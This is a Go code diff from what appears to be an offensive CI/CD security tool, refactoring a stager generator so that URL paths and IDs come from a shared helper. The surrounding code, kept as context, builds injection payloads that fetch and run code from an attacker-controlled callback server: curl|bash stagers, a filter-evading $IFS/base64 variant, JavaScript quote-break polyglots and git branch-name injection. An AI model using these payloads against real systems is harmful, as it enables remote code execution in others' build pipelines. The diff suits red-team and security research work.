@@ -4,11 +4,11 @@
 package rye
 
 import (
-	"crypto/rand"
 	"encoding/base64"
-	"encoding/hex"
 	"fmt"
 	"strings"
+
+	"github.com/boostsecurityio/smokedmeat/internal/stagerurl"
 )
 
 // Mode represents the injection automation level.
@@ -72,7 +72,7 @@ func NewStagerWithID(id, kitchenURL string, ctx InjectionContext) *Stager {
 
 // CallbackURL returns the full callback URL.
 func (s *Stager) CallbackURL() string {
-	return fmt.Sprintf("%s/r/%s", s.KitchenURL, s.ID)
+	return stagerurl.Join(s.KitchenURL, s.ID)
 }
 
 // Generate creates a stager payload appropriate for the context.
@@ -109,7 +109,7 @@ func (s *Stager) generateBashStager() StagerPayload {
 		Raw:         raw,
 		Context:     s.Context.Name,
 		Technique:   "curl_bash",
-		KitchenPath: "/r/" + s.ID,
+		KitchenPath: stagerurl.Path(s.ID),
 		CallbackURL: callbackURL,
 		Notes:       "Standard curl|bash stager. Requires curl in PATH.",
 	}
@@ -139,7 +139,7 @@ func (s *Stager) generateIFSStager() StagerPayload {
 		Encoded:     encodedURL,
 		Context:     s.Context.Name,
 		Technique:   "ifs_base64_curl_bash",
-		KitchenPath: "/r/" + s.ID,
+		KitchenPath: stagerurl.Path(s.ID),
 		CallbackURL: callbackURL,
 		Notes:       fmt.Sprintf("Uses $IFS for spaces, base64-encoded URL. Decoded URL: %s", callbackURL),
 	}
@@ -166,7 +166,7 @@ func (s *Stager) GeneratePolyglot() StagerPayload {
 		Raw:         polyglot,
 		Context:     s.Context.Name,
 		Technique:   "js_quote_polyglot",
-		KitchenPath: "/r/" + s.ID,
+		KitchenPath: stagerurl.Path(s.ID),
 		CallbackURL: callbackURL,
 		Notes:       "Universal polyglot - works in both single and double quote JS contexts.",
 	}
@@ -182,7 +182,7 @@ func (s *Stager) GenerateSingleQuoteBreak() StagerPayload {
 		Raw:         payload,
 		Context:     s.Context.Name,
 		Technique:   "js_single_quote_break",
-		KitchenPath: "/r/" + s.ID,
+		KitchenPath: stagerurl.Path(s.ID),
 		CallbackURL: callbackURL,
 		Notes:       "Single-quote JS string break payload.",
 	}
@@ -199,26 +199,7 @@ func (s *Stager) sanitizeForContext(payload string) string {
 
 // generateStagerID creates a random 8-byte hex ID.
 func generateStagerID() string {
-	b := make([]byte, 8)
-	if _, err := rand.Read(b); err != nil {
-		// Fallback to timestamp-based ID
-		return fmt.Sprintf("stg%d", randInt())
-	}
-	return hex.EncodeToString(b)
-}
-
-// randInt generates a pseudo-random int for fallback IDs.
-func randInt() int64 {
-	b := make([]byte, 8)
-	_, _ = rand.Read(b)
-	var n int64
-	for _, v := range b {
-		n = (n << 8) | int64(v)
-	}
-	if n < 0 {
-		n = -n
-	}
-	return n
+	return stagerurl.GenerateID()
 }
 
 // BranchNameStager is a convenience function for git branch injection.
